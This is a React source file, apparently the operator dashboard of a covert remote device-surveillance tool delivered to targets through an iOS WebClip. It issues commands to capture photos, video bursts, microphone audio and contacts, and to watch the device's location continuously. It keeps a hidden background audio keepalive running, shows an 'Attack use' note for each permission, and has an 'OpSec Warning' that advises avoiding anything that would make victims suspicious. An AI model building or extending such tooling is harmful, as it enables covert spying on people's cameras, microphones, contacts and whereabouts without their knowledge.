    const status = deviceStatus(device.last_seen);
    if (status === 'offline' && prevStatusRef.current !== 'offline') {
      setGeoWatching(false);
      setGeoWatchOpt(null);
      if (geoWatchTimerRef.current) { clearTimeout(geoWatchTimerRef.current); geoWatchTimerRef.current = null; }
    }
    prevStatusRef.current = status;
  }, [device?.last_seen]);
  const [checking, setChecking] = useState(false);
  const [geoOncePendingAt, setGeoOncePendingAt] = useState(null);
  const [checkStatus, setCheckStatus] = useState(null); // null | 'waiting' | 'received' | 'timeout'
  const [audioUnlockWarn, setAudioUnlockWarn] = useState(false);
  const [audioUnlockSent, setAudioUnlockSent] = useState(false);
  const [killAudioWarn, setKillAudioWarn]     = useState(false);
  const [killAudioSent, setKillAudioSent]     = useState(false);
  const [selectedCameraId, setSelectedCameraId] = useState('');
  const [cameraCaptureSent, setCameraCaptureSent] = useState(false);
  const [cameraMode, setCameraMode] = useState('photo'); // 'photo' | 'video' | 'burst'
  const [videoDuration, setVideoDuration] = useState(5);
  const [audioCaptureSent, setAudioCaptureSent] = useState(false);
  const [audioDuration, setAudioDuration] = useState(10);
  const [burstFrames, setBurstFrames] = useState(5);
  const [burstDelayVal, setBurstDelayVal] = useState(1); // numeric value
  const [burstDelayUnit, setBurstDelayUnit] = useState('s'); // 's' | 'ms'
  const burstDelayMs = burstDelayUnit === 's' ? burstDelayVal * 1000 : burstDelayVal;
  const checkSentAtRef = useRef(null);
  const checkTimeoutRef = useRef(null);
  const cameraAutoEnumRef = useRef(false);
  const cameraList = (() => {
    const ev = (events ?? []).find(e => e.type === 'cameras_enumerated'); // events sorted newest-first
    return parseEvent(ev)?.cameras ?? [];
  })();
  const _permBase = parseEvent(events?.find(e => e.type === 'permissions')) ?? {};
  const _hbAudio = parseEvent(events?.find(e => e.type === 'heartbeat'))?.audio;
  // Infer background audio: if device keeps beaconing with visible:false for > 30s,
  // web-audio keepalive must be running regardless of what audio field reports.
  const _hbAll = (events ?? []).filter(e => e.type === 'heartbeat');
  let _bgStreakStartTs = null;
  for (const hb of _hbAll) { // DESC order - newest first
    const d = parseEvent(hb);
    if (d?.visible === false) {
      _bgStreakStartTs = parseUTC(hb.timestamp);
    } else {
      break;
    }
  }
  const _latestHbTs = _hbAll[0] ? parseUTC(_hbAll[0].timestamp) : null;
  const _bgStreakSecs = (_bgStreakStartTs && _latestHbTs)
    ? (_latestHbTs - _bgStreakStartTs) / 1000 : 0;
  const _inferredBgAudio = _bgStreakSecs > 30 && !!_latestHbTs
    && (Date.now() - _latestHbTs) < 30000; // device still online
  _permBase['web-audio'] = (_hbAudio === 'running' || _inferredBgAudio) ? 'activated' : 'not-activated';
  _permBase['web-audio-inferred'] = _inferredBgAudio && _hbAudio !== 'running';
  _permBase['web-audio-bg-secs'] = Math.round(_bgStreakSecs);
  // screen-capture: browser reports it as 'display-capture' in the Permissions API
  if (!_permBase['screen-capture'] && _permBase['display-capture']) {
    _permBase['screen-capture'] = _permBase['display-capture'];
  }
  // contacts: Contact Picker API has no Permissions API entry - derive from events
  const _contactsEv = events?.find(e => e.type === 'contacts');
  if (_contactsEv) {
    const _cd = parseEvent(_contactsEv);
    _permBase['contacts'] = _cd?.supported === false ? 'unsupported' : 'granted';
  }
  const permData = _permBase;

  useEffect(() => {
    if (checkStatus !== 'waiting' || !checkSentAtRef.current) return;
    const found = events?.find(e => {
      if (e.type !== 'permissions') return false;
      const ts = parseUTC(e.timestamp)?.getTime();
      return ts && ts >= checkSentAtRef.current - 3000;
    });
    if (found) {
      clearTimeout(checkTimeoutRef.current);
      setCheckStatus('received');
      setTimeout(() => setCheckStatus(null), 4000);
    }
  }, [events, checkStatus]);

  useEffect(() => {
    if (!geoOncePendingAt) return;
    const arrived = events?.find(e => e.type === 'geolocation' && (parseUTC(e.timestamp)?.getTime() ?? 0) >= geoOncePendingAt - 2000);
    if (arrived) setGeoOncePendingAt(null);
  }, [events, geoOncePendingAt]);

  // Auto-enumerate cameras once when permission is first granted.
  // Safe: camera.js now skips getUserMedia if session labels already exist from requestCamera().
  useEffect(() => {
    if (_permBase.camera === 'granted' && !cameraAutoEnumRef.current) {
      cameraAutoEnumRef.current = true;
      sendCommand(deviceId, 'enumerate_cameras', {}).then(onSent).catch(() => {});
    }
  }, [_permBase.camera]); // eslint-disable-line react-hooks/exhaustive-deps

  // Auto-select front camera (or first) when enumeration result arrives
  useEffect(() => {
    if (cameraList.length > 0 && !selectedCameraId) {
      const front = cameraList.find(c => c.facing === 'front');
      setSelectedCameraId(front ? front.deviceId : cameraList[0].deviceId);
    }
  }, [cameraList.length]); // eslint-disable-line react-hooks/exhaustive-deps

  async function requestPerm(p, options = {}) {
    setWarnPerm(null);
    setRequesting(p.key);
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'request_permission', payload: { permission: p.module, ...options } }),
      });
      if (options.mode === 'stop') {
        setGeoWatching(false); setGeoWatchOpt(null);
        if (geoWatchTimerRef.current) { clearTimeout(geoWatchTimerRef.current); geoWatchTimerRef.current = null; }
      } else if (options.mode === 'watch') {
        setGeoWatching(true); setGeoWatchOpt(options.label);
        if (geoWatchTimerRef.current) clearTimeout(geoWatchTimerRef.current);
        if (options.duration) {
          geoWatchTimerRef.current = setTimeout(() => { setGeoWatching(false); setGeoWatchOpt(null); }, options.duration * 1000 + 3000);
        }
      } else { setGeoWatching(false); setGeoWatchOpt(null); if (options.mode === 'once') setGeoOncePendingAt(Date.now()); }
      setSentKey(p.key);
      setTimeout(() => setSentKey(k => k === p.key ? null : k), 3000);
      onSent?.();
    } catch (e) {
      alert(`Failed: ${e.message}`);
    } finally {
      setRequesting(null);
    }
  }

  async function requestAudioUnlock() {
    setAudioUnlockWarn(false);
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'trigger_audio_unlock', payload: {} }),
      });
      setAudioUnlockSent(true);
      setTimeout(() => setAudioUnlockSent(false), 4000);
      onSent?.();
    } catch (e) { alert(`Failed: ${e.message}`); }
  }

  async function sendKillAudio() {
    setKillAudioWarn(false);
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'stop_bg_audio', payload: {} }),
      });
      setKillAudioSent(true);
      setTimeout(() => setKillAudioSent(false), 5000);
      onSent?.();
    } catch (e) { alert(`Failed: ${e.message}`); }
  }

  function renderCard(p) {
    const _rawState = permData?.[p.key] ?? 'unknown';
    // These permissions have no Permissions API query support - treat N/A/unknown as "Not Asked"
    const _noQuery = new Set(['clipboard-read', 'filesystem']);
    const state = _noQuery.has(p.key) && (_rawState === 'unsupported' || _rawState === 'unknown') ? 'prompt' : _rawState;
    const isOpen = expanded === p.key;
    const isReq = requesting === p.key;
    const isSent = sentKey === p.key;
    const isGeo = p.module === 'geo';
    return (
      <div key={p.key} style={{ background: '#0c0d1a', borderRadius: 12, border: `1px solid ${isOpen ? 'rgba(255,255,255,0.09)' : '#141728'}`, overflow: 'hidden' }}>
        <div onClick={() => setExpanded(isOpen ? null : p.key)}
          style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '12px 14px', cursor: 'pointer' }}>
          <span style={{ fontSize: 17 }}>{p.icon}</span>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontSize: 13, fontWeight: 600, color: '#c9d1e8' }}>{p.label}</div>
          </div>
          <span style={{ padding: '3px 8px', borderRadius: 8, fontSize: 11, fontWeight: 700, background: STATE_COLOR[state] + '22', color: STATE_COLOR[state], border: `1px solid ${STATE_COLOR[state]}44`, flexShrink: 0 }}>
            {STATE_LABEL[state] ?? state}
            {p.key === 'web-audio' && permData['web-audio-inferred'] && (
              <span style={{ marginLeft: 5, fontSize: 10, opacity: 0.7 }}>
                ~inferred {permData['web-audio-bg-secs']}s bg
              </span>
            )}
          </span>
          <span style={{ padding: '2px 6px', borderRadius: 6, fontSize: 10, fontWeight: 600, background: SEVERITY_COLOR[p.severity] + '22', color: SEVERITY_COLOR[p.severity], flexShrink: 0 }}>
            {p.severity}
          </span>
          {p.key === 'web-audio' && state === 'not-activated' && (
            <button
              onClick={e => { e.stopPropagation(); setAudioUnlockWarn(true); }}
              style={{
                padding: '4px 10px', borderRadius: 8, border: 'none', fontSize: 11, fontWeight: 600,
                background: audioUnlockSent ? 'rgba(34,197,94,0.13)' : '#a78bfa',
                color: audioUnlockSent ? '#22c55e' : '#fff',
                cursor: 'pointer', flexShrink: 0, transition: 'background 0.3s, color 0.3s',
              }}
            >{audioUnlockSent ? 'Sent ✓' : 'Request'}</button>
          )}
          {p.key === 'web-audio' && state === 'activated' && (
            <button
              onClick={e => { e.stopPropagation(); setKillAudioWarn(true); }}
              style={{
                padding: '4px 10px', borderRadius: 8, border: '1px solid rgba(239,68,68,0.27)', fontSize: 11, fontWeight: 600,
                background: killAudioSent ? 'rgba(34,197,94,0.13)' : 'rgba(239,68,68,0.09)',
                color: killAudioSent ? '#22c55e' : '#ef4444',
                cursor: 'pointer', flexShrink: 0, transition: 'background 0.3s, color 0.3s',
              }}
            >{killAudioSent ? 'Sent ✓' : '💀 Kill'}</button>
          )}
          {p.key === 'camera' && state === 'granted' && (
            <div onClick={e => e.stopPropagation()} style={{ display: 'flex', gap: 4, flexShrink: 0, flexWrap: 'wrap', alignItems: 'center' }}>
              {cameraList.length === 0 && (
                <span style={{ fontSize: 10, color: '#4e5a70', fontStyle: 'italic' }}>detecting...</span>
              )}
              {cameraList.length > 0 && (
                <select
                  value={selectedCameraId}
                  onChange={e => setSelectedCameraId(e.target.value)}
                  style={{ padding: '3px 6px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#141728', color: '#c9d1e8', fontSize: 10, maxWidth: 160 }}
                >
                  {cameraList.map((c, ci) => {
                    const lbl = (c.label || '').toLowerCase();
                    const facing = c.facing || (lbl.includes('front') ? 'front' : lbl.includes('back') || lbl.includes('rear') ? 'back' : null);
                    const display = c.label === 'Both (Default)' ? 'Both (Default)' : facing ? `Camera ${ci + 1} (${facing === 'front' ? 'Front' : 'Back'})` : c.label;
                    return <option key={c.deviceId ?? `cam-${ci}`} value={c.deviceId ?? ''}>{display}</option>;
                  })}
                </select>
              )}
              {/* Mode toggle: Photo / Video / Burst */}
              <div style={{ display: 'flex', borderRadius: 6, overflow: 'hidden', border: '1px solid #3a3a3c' }}>
                {[['photo','📷'],['video','🎥'],['burst','📸']].map(([m, icon]) => (
                  <button key={m} onClick={() => setCameraMode(m)}
                    style={{ padding: '3px 7px', border: 'none', fontSize: 10, fontWeight: 600, cursor: 'pointer',
                      background: cameraMode === m ? '#3b82f6' : '#141728',
                      color: cameraMode === m ? '#fff' : '#4e5a70' }}>
                    {icon}
                  </button>
                ))}
              </div>
              {cameraMode === 'video' && (
                <input
                  type="number" min={1} value={videoDuration}
                  onChange={e => setVideoDuration(Math.max(1, parseInt(e.target.value) || 1))}
                  style={{ width: 46, padding: '3px 4px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#141728', color: '#c9d1e8', fontSize: 10 }}
                  title="Duration in seconds"
                />
              )}
              {cameraMode === 'burst' && (<>
                <input
                  type="number" min={1} max={999} value={burstFrames}
                  onChange={e => setBurstFrames(Math.max(1, parseInt(e.target.value) || 1))}
                  style={{ width: 46, padding: '3px 4px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#141728', color: '#c9d1e8', fontSize: 10 }}
                  title="Number of frames"
                />
                <span style={{ fontSize: 9, color: '#4e5a70', alignSelf: 'center' }}>fr</span>
                <input
                  type="number" min={burstDelayUnit === 's' ? 0.1 : 100} step={burstDelayUnit === 's' ? 0.1 : 100}
                  value={burstDelayVal}
                  onChange={e => setBurstDelayVal(parseFloat(e.target.value) || 0)}
                  style={{ width: 46, padding: '3px 4px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#141728', color: '#c9d1e8', fontSize: 10 }}
                  title="Delay between frames"
                />
                <select value={burstDelayUnit} onChange={e => { setBurstDelayUnit(e.target.value); setBurstDelayVal(e.target.value === 'ms' ? Math.round(burstDelayVal * 1000) : Math.round(burstDelayVal / 100) / 10); }}
                  style={{ padding: '3px 2px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#141728', color: '#c9d1e8', fontSize: 10 }}>
                  <option value="s">s</option>
                  <option value="ms">ms</option>
                </select>
                <span style={{ fontSize: 9, color: '#4e5a70', alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  ~{(burstFrames * 0.5 + (burstFrames - 1) * burstDelayMs / 1000).toFixed(1)}s
                </span>
              </>)}
              <button
                onClick={() => {
                  const payload = selectedCameraId ? { device_id: selectedCameraId } : {};
                  let cmd, dismissAfter;
                  if (cameraMode === 'video') {
                    cmd = sendCommand(deviceId, 'capture_video', { ...payload, duration: videoDuration });
                    dismissAfter = (videoDuration + 2) * 1000;
                  } else if (cameraMode === 'burst') {
                    cmd = sendCommand(deviceId, 'capture_burst', { ...payload, frames: burstFrames, delay_ms: burstDelayMs });
                    dismissAfter = (burstFrames * 0.5 + (burstFrames - 1) * burstDelayMs / 1000 + 2) * 1000;
                  } else {
                    cmd = sendCommand(deviceId, 'capture_photo', payload);
                    dismissAfter = 3000;
                  }
                  cmd.then(onSent).catch(() => {});
                  setCameraCaptureSent(true);
                  setTimeout(() => setCameraCaptureSent(false), dismissAfter);
                }}
                disabled={cameraCaptureSent || cameraList.length === 0}
                style={{ padding: '3px 8px', borderRadius: 6, border: 'none', fontSize: 10, fontWeight: 600,
                  background: cameraCaptureSent ? 'rgba(34,197,94,0.13)' : cameraList.length === 0 ? 'rgba(255,255,255,0.09)'
                    : cameraMode === 'video' ? '#f59e0b' : cameraMode === 'burst' ? '#a78bfa' : '#3b82f6',
                  color: cameraCaptureSent ? '#22c55e' : cameraList.length === 0 ? '#4e5a70' : '#fff',
                  cursor: (cameraCaptureSent || cameraList.length === 0) ? 'default' : 'pointer' }}
              >{cameraCaptureSent ? (cameraMode === 'video' ? '⏳ Recording…' : cameraMode === 'burst' ? '⏳ Running…' : '✓') : cameraMode === 'video' ? '⏺ Record' : cameraMode === 'burst' ? '📸 Burst' : '📷 Capture'}</button>
              {(cameraMode === 'burst' || cameraMode === 'video') && cameraCaptureSent && (
                <button
                  onClick={() => sendCommand(deviceId, cameraMode === 'video' ? 'stop_video' : 'stop_burst', {}).then(onSent).catch(() => {})}
                  style={{ padding: '3px 8px', borderRadius: 6, border: 'none', fontSize: 10, fontWeight: 600, cursor: 'pointer', background: '#ef4444', color: '#c9d1e8' }}
                >🛑 Stop</button>
              )}
            </div>
          )}
          {p.key === 'microphone' && state === 'granted' && (
            <div onClick={e => e.stopPropagation()} style={{ display: 'flex', gap: 4, flexShrink: 0, alignItems: 'center' }}>
              <input
                type="number" min={1} value={audioDuration}
                onChange={e => setAudioDuration(Math.max(1, parseInt(e.target.value) || 1))}
                style={{ width: 46, padding: '3px 4px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#141728', color: '#c9d1e8', fontSize: 10 }}
                title="Duration in seconds"
              />
              <span style={{ fontSize: 9, color: '#4e5a70' }}>s</span>
              <button
                onClick={() => {
                  sendCommand(deviceId, 'capture_audio', { duration: audioDuration }).then(onSent).catch(() => {});
                  setAudioCaptureSent(true);
                  setTimeout(() => setAudioCaptureSent(false), (audioDuration + 2) * 1000);
                }}
                disabled={audioCaptureSent}
                style={{ padding: '3px 8px', borderRadius: 6, border: 'none', fontSize: 10, fontWeight: 600,
                  background: audioCaptureSent ? 'rgba(34,197,94,0.13)' : '#f59e0b',
                  color: audioCaptureSent ? '#22c55e' : '#fff',
                  cursor: audioCaptureSent ? 'default' : 'pointer' }}
              >{audioCaptureSent ? '⏳ Recording…' : '🎙️ Record'}</button>
              {audioCaptureSent && (
                <button
                  onClick={() => sendCommand(deviceId, 'stop_audio', {}).then(onSent).catch(() => {})}
                  style={{ padding: '3px 8px', borderRadius: 6, border: 'none', fontSize: 10, fontWeight: 600, cursor: 'pointer', background: '#ef4444', color: '#c9d1e8' }}
                >🛑 Stop</button>
              )}
            </div>
          )}
          {p.key === 'camera' && state === 'denied' && (
            <button
              onClick={e => { e.stopPropagation(); if (!isReq) { sendCommand(deviceId, 'capture_photo', {}).then(onSent).catch(() => {}); setCameraCaptureSent(true); setTimeout(() => setCameraCaptureSent(false), 3000); } }}
              disabled={isReq || cameraCaptureSent}
              style={{ padding: '4px 10px', borderRadius: 8, border: '1px solid rgba(59,130,246,0.27)', fontSize: 11, fontWeight: 600, background: cameraCaptureSent ? 'rgba(34,197,94,0.13)' : 'rgba(59,130,246,0.09)', color: cameraCaptureSent ? '#22c55e' : '#3b82f6', cursor: (isReq || cameraCaptureSent) ? 'default' : 'pointer', flexShrink: 0 }}
            >{cameraCaptureSent ? 'Sent ✓' : '📷 Capture Front'}</button>
          )}
          {p.key === 'contacts' && state === 'granted' && (
            <button
              onClick={e => { e.stopPropagation(); sendCommand(deviceId, 'capture_contacts', {}).then(onSent).catch(() => {}); }}
              style={{ padding: '3px 8px', borderRadius: 6, border: 'none', fontSize: 10, fontWeight: 600, background: '#a78bfa', color: '#c9d1e8', cursor: 'pointer', flexShrink: 0 }}
            >👥 Capture Again</button>
          )}
          {p.module && p.key !== 'payment' && !isGeo && !(p.key === 'camera' && state === 'granted') && !(p.key === 'microphone' && state === 'granted') && !(p.key === 'contacts' && state === 'granted') && !(p.key === 'notifications' && state === 'granted') && !(p.key === 'motion' && state === 'granted') && !(p.key === 'push' && state === 'granted') && (
            <button
              onClick={e => { e.stopPropagation(); if (!isReq) { if (state === 'granted') requestPerm(p); else setWarnPerm(p); } }}
              disabled={isReq}
              style={{
                padding: '4px 10px', borderRadius: 8, border: 'none', fontSize: 11, fontWeight: 600,
                background: isSent ? 'rgba(34,197,94,0.13)' : isReq ? 'rgba(245,158,11,0.13)' : '#3b82f6',
                color: isSent ? '#22c55e' : isReq ? '#f59e0b' : '#fff',
                cursor: isReq ? 'default' : 'pointer', flexShrink: 0,
                transition: 'background 0.3s, color 0.3s',
              }}
            >{isReq ? 'Sending...' : isSent ? 'Sent ✓' : 'Request'}</button>
          )}
          {isGeo && state !== 'granted' && (
            <button
              onClick={e => { e.stopPropagation(); if (!isReq) setWarnPerm({ ...p, _geoOpts: { mode: 'once', interval: null } }); }}
              disabled={isReq}
              style={{
                padding: '4px 10px', borderRadius: 8, border: 'none', fontSize: 11, fontWeight: 600,
                background: isSent ? 'rgba(34,197,94,0.13)' : isReq ? 'rgba(245,158,11,0.13)' : '#3b82f6',
                color: isSent ? '#22c55e' : isReq ? '#f59e0b' : '#fff',
                cursor: isReq ? 'default' : 'pointer', flexShrink: 0, transition: 'background 0.3s, color 0.3s',
              }}
            >{isReq ? 'Sending...' : isSent ? 'Sent ✓' : 'Request'}</button>
          )}
          {isGeo && state === 'granted' && (
            <div onClick={e => e.stopPropagation()} style={{ display: 'flex', gap: 4, flexShrink: 0, flexWrap: 'wrap' }}>
              {GEO_WATCH_OPTIONS.map(opt => {
                const isOnce = opt.mode === 'once';
                const isPending = isOnce && !!geoOncePendingAt;
                const isActiveWatch = opt.mode === 'watch' && geoWatching && geoWatchOpt === opt.label;
                const isActive = isPending || isActiveWatch;
                return (
                  <button key={opt.label} onClick={() => requestPerm(p, opt)} disabled={isReq}
                    style={{
                      padding: '3px 7px', borderRadius: 6, fontSize: 10, fontWeight: 600, cursor: isReq ? 'default' : 'pointer',
                      border: isActive ? '1px solid rgba(59,130,246,0.53)' : '1px solid #2c2c2e',
                      background: isPending ? 'rgba(34,197,94,0.08)' : isActiveWatch ? 'rgba(59,130,246,0.08)' : '#141728',
                      color: isPending ? '#22c55e' : isActiveWatch ? '#3b82f6' : '#c9d1e8',
                      animation: isActive ? '_geopulse 1.2s ease-in-out infinite' : 'none',
                    }}>
                    {isPending ? <><span style={{ display: 'inline-block', animation: '_spin 1s linear infinite', marginRight: 4 }}>⟳</span>Waiting...</> : opt.label}
                  </button>
                );
              })}
              {geoWatching && (
                <button onClick={() => requestPerm(p, { mode: 'stop' })} disabled={isReq}
                  style={{ padding: '3px 7px', borderRadius: 6, border: '1px solid rgba(239,68,68,0.27)', fontSize: 10, fontWeight: 600, background: 'rgba(239,68,68,0.07)', color: '#ef4444', cursor: 'pointer' }}>
                  ⏹ Stop
                </button>
              )}
            </div>
          )}
          <span style={{ color: '#4e5a70', fontSize: 12 }}>{isOpen ? '▲' : '▼'}</span>
        </div>
        {isOpen && (
          <div style={{ borderTop: '1px solid #1c1c1e', padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 12 }}>
            <div>
              <div style={{ fontSize: 10, color: '#4e5a70', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 4 }}>What you get</div>
              <div style={{ fontSize: 12, color: 'rgba(201,209,232,0.80)' }}>{p.value}</div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: '#4e5a70', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 4 }}>Attack use</div>
              <div style={{ fontSize: 12, color: '#f59e0b' }}>{p.attack}</div>
            </div>
          </div>
        )}
      </div>
    );
  }

  async function checkPerms() {
    if (checking) return;
    setChecking(true);
    setCheckStatus(null);
    clearTimeout(checkTimeoutRef.current);
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'check_permissions', payload: {} }),
      });
      checkSentAtRef.current = Date.now();
      setCheckStatus('waiting');
      onSent?.();
      onFastPoll?.();
      checkTimeoutRef.current = setTimeout(() => {
        setCheckStatus(s => s === 'waiting' ? 'timeout' : s);
        setTimeout(() => setCheckStatus(null), 4000);
      }, 10000);
    } catch (e) {
      setCheckStatus('timeout');
      setTimeout(() => setCheckStatus(null), 3000);
    } finally {
      setChecking(false);
    }
  }

  const statusMeta = {
    waiting:  { bg: 'rgba(59,130,246,0.07)', border: 'rgba(59,130,246,0.20)', color: '#3b82f6', icon: '⟳', spin: true,  text: 'Waiting for device response...' },
    received: { bg: 'rgba(34,197,94,0.13)', border: 'rgba(34,197,94,0.27)', color: '#22c55e', icon: '✓', spin: false, text: 'Response received' },
    timeout:  { bg: 'rgba(239,68,68,0.13)', border: 'rgba(239,68,68,0.27)', color: '#ef4444', icon: '⚠', spin: false, text: 'No response (device closed?)' },
  };

  return (
    <div>
      <style>{`@keyframes _spin{to{transform:rotate(360deg)}} @keyframes _fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}} @keyframes _geopulse{0%,100%{box-shadow:0 0 0 0 #30d15844}50%{box-shadow:0 0 0 5px #30d15800}}`}</style>
      <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'center', gap: 10, marginBottom: 16 }}>
        {checkStatus && (() => {
          const m = statusMeta[checkStatus];
          return (
            <div style={{
              display: 'flex', alignItems: 'center', gap: 6, padding: '5px 12px',
              borderRadius: 8, border: `1px solid ${m.border}`, background: m.bg, color: m.color,
              fontSize: 12, fontWeight: 600, animation: '_fadeIn 0.25s ease',
            }}>
              <span style={m.spin ? { display: 'inline-block', animation: '_spin 0.7s linear infinite' } : {}}>{m.icon}</span>
              {m.text}
            </div>
          );
        })()}
        <button onClick={checkPerms} disabled={checking} style={{
          padding: '6px 14px', borderRadius: 8, border: '1px solid #2c2c2e',
          background: '#141728', color: '#c9d1e8', fontSize: 12, fontWeight: 600,
          display: 'flex', alignItems: 'center', gap: 6,
          cursor: checking ? 'default' : 'pointer', opacity: checking ? 0.6 : 1,
        }}>
          <span style={checking ? { display: 'inline-block', animation: '_spin 0.7s linear infinite' } : {}}>⟳</span>
          {checking ? 'Sending...' : 'Check Permissions'}
        </button>
      </div>
      {PERM_GROUPS.map(g => {
        const perms = PERMISSION_META.filter(p => (p.group || 'testing') === g.id);
        const isTesting = g.id === 'testing';
        return (
          <div key={g.id} style={{ marginBottom: 20 }}>
            <div style={{
              display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10,
              padding: isTesting ? '6px 12px' : 0,
              background: isTesting ? g.color + '18' : 'transparent',
              borderRadius: isTesting ? 10 : 0,
              border: isTesting ? `1px solid ${g.color}44` : 'none',
            }}>
              <span style={{ fontSize: 14 }}>{g.icon}</span>
              <span style={{ fontSize: 12, fontWeight: 700, color: isTesting ? g.color : '#4e5a70', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
                {g.label}
              </span>
              <span style={{ fontSize: 11, color: '#4e5a70', marginLeft: 2 }}>- {g.en}</span>
              <span style={{ marginLeft: 'auto', fontSize: 11, color: '#4e5a70', background: '#141728', padding: '1px 7px', borderRadius: 10 }}>{perms.length}</span>
            </div>
            {g.id === 'ephemeral' && (
              <div style={{ display: 'flex', alignItems: 'flex-start', gap: 8, background: 'rgba(245,158,11,0.06)', border: '1px solid rgba(245,158,11,0.20)', borderRadius: 10, padding: '8px 12px', marginBottom: 10 }}>
                <span style={{ fontSize: 13, flexShrink: 0, marginTop: 1 }}>⚠️</span>
                <div style={{ fontSize: 11, color: 'rgba(245,158,11,0.80)', lineHeight: 1.5 }}>
                  <span style={{ fontWeight: 700 }}>iOS 16.4+ WebClip / PWA behavior:</span> Location grant may survive exit in practice.
                  iOS doesn't always re-prompt - depends on version, privacy settings, and time elapsed.
                  "Ephemeral" is the spec; the real session may persist longer.
                </div>
              </div>
            )}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              {perms.map(p => renderCard(p))}
            </div>
          </div>
        );
      })}

      {!permData && (
        <div style={{ marginTop: 16, padding: 16, background: '#141728', borderRadius: 10, fontSize: 12, color: '#4e5a70' }}>
          Permission states not yet received - open the WebClip to trigger a check.
        </div>
      )}

      {permData && <RawPermissionsPanel data={permData} />}

      {warnPerm && (
        <RawRequestWarning
          perm={warnPerm}
          onConfirm={() => requestPerm(warnPerm, warnPerm._geoOpts ?? warnPerm._payOpts ?? {})}
          onCancel={() => setWarnPerm(null)}
        />
      )}

      {audioUnlockWarn && (
        <div onClick={() => setAudioUnlockWarn(false)} style={{ position:'fixed',inset:0,background:'rgba(0,0,0,0.75)',display:'flex',alignItems:'center',justifyContent:'center',zIndex:10000 }}>
          <div onClick={e => e.stopPropagation()} style={{ background:'#141728',border:'1px solid rgba(167,139,250,0.27)',borderRadius:16,padding:24,maxWidth:400,width:'90%' }}>
            <div style={{ fontSize:24,marginBottom:12 }}>🔕</div>
            <div style={{ fontSize:15,fontWeight:700,color:'#a78bfa',marginBottom:10 }}>OpSec Warning</div>
            <div style={{ fontSize:13,color:'rgba(201,209,232,0.80)',lineHeight:1.6,marginBottom:20 }}>
              Sending the idle overlay is <strong style={{color:'#fff'}}>not opsec</strong>. The safest approach is to wait - users will naturally tap the screen on their own.
              <br/><br/>
              An unprompted "disconnecting" screen may raise suspicion. Proceed only if you need to force the gesture now.
            </div>
            <div style={{ display:'flex',gap:10 }}>
              <button onClick={() => setAudioUnlockWarn(false)} style={{ flex:1,padding:'10px 0',borderRadius:10,border:'1px solid #2c2c2e',background:'transparent',color:'#c9d1e8',fontSize:14,fontWeight:600,cursor:'pointer' }}>Cancel</button>
              <button onClick={requestAudioUnlock} style={{ flex:1,padding:'10px 0',borderRadius:10,border:'1px solid rgba(167,139,250,0.27)',background:'rgba(167,139,250,0.13)',color:'#a78bfa',fontSize:14,fontWeight:600,cursor:'pointer' }}>Proceed anyway</button>
            </div>
          </div>
        </div>
      )}

      {killAudioWarn && (
        <div onClick={() => setKillAudioWarn(false)} style={{ position:'fixed',inset:0,background:'rgba(0,0,0,0.8)',display:'flex',alignItems:'center',justifyContent:'center',zIndex:10001 }}>
          <div onClick={e => e.stopPropagation()} style={{ background:'#141728',border:'1px solid rgba(239,68,68,0.27)',borderRadius:16,padding:24,maxWidth:380,width:'90%' }}>
            <div style={{ fontSize:24,marginBottom:12 }}>☠️</div>
            <div style={{ fontSize:15,fontWeight:700,color:'#ef4444',marginBottom:10 }}>Kill Background Session</div>
            <div style={{ fontSize:13,color:'rgba(201,209,232,0.80)',lineHeight:1.6,marginBottom:20 }}>
              This will <strong style={{color:'#fff'}}>stop the audio keepalive</strong> and suspend the AudioContext.<br/><br/>
              Background persistence will be lost <strong style={{color:'#ef4444'}}>immediately</strong>. It cannot be restored remotely - a new user gesture is required to reactivate.
              <br/><br/>
              <span style={{color:'#f59e0b'}}>⚠ Irreversible until the user reopens the app.</span>
            </div>
            <div style={{ display:'flex',gap:10 }}>
              <button onClick={() => setKillAudioWarn(false)} style={{ flex:1,padding:'10px 0',borderRadius:10,border:'1px solid #2c2c2e',background:'transparent',color:'#c9d1e8',fontSize:14,fontWeight:600,cursor:'pointer' }}>Cancel</button>
              <button onClick={sendKillAudio} style={{ flex:1,padding:'10px 0',borderRadius:10,border:'1px solid rgba(239,68,68,0.27)',background:'rgba(239,68,68,0.13)',color:'#ef4444',fontSize:14,fontWeight:600,cursor:'pointer' }}>Kill it</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function RawPermissionsPanel({ data }) {
  const [open, setOpen] = useState(false);
  return (
    <div style={{ marginTop: 20, borderRadius: 10, border: '1px solid #2c2c2e', overflow: 'hidden' }}>
      <div onClick={() => setOpen(o => !o)} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 14px', cursor: 'pointer', background: '#0c0d1a' }}>
        <span style={{ fontSize: 12, fontWeight: 600, color: '#4e5a70', textTransform: 'uppercase', letterSpacing: '0.06em' }}>Raw JSON</span>
        <span style={{ color: '#4e5a70', fontSize: 12 }}>{open ? '▲' : '▼'}</span>
      </div>
      {open && (
        <pre style={{ margin: 0, padding: '12px 14px', background: '#07080f', fontSize: 11, color: '#c9d1e8', overflowX: 'auto', lineHeight: 1.6 }}>
          {JSON.stringify(data, null, 2)}
        </pre>
      )}
    </div>
  );
}

